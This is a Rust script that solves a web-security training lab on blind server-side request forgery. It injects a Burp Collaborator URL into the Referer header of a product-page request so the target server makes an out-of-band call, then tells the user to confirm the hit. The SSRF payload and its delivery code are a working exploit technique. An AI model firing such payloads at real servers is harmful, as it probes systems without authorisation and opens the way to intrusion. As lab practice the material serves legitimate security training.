/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 19/10/2023
*
* Lab: Blind SSRF with out-of-band detection
*
* Steps: 1. Inject payload into the Referer header to cause an HTTP request 
*           to the burp collaborator
*        2. Check your burp collaborator for the HTTP request
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a24005e04e9738a84da45370077004a.web-security-academy.net";

    // change this to your collaborator domain
    let collaborator = "en5549qqmnezra5je5lvymsai1oscj08.oastify.com";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "⟪#⟫ Injection point:".blue(),
        "Referer header".yellow(),
    );

    // payload to cause an HTTP request to the burp collaborator
    let payload = format!("https://{collaborator}");

    print!(
        "{}",
        "❯ Injecting payload to cause an HTTP request to the burp collaborator.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    client
        .get(format!("{url}/product?productId=1"))
        .header("Referer", payload)
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 Check your burp collaborator for the HTTP request"
            .white()
            .bold()
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
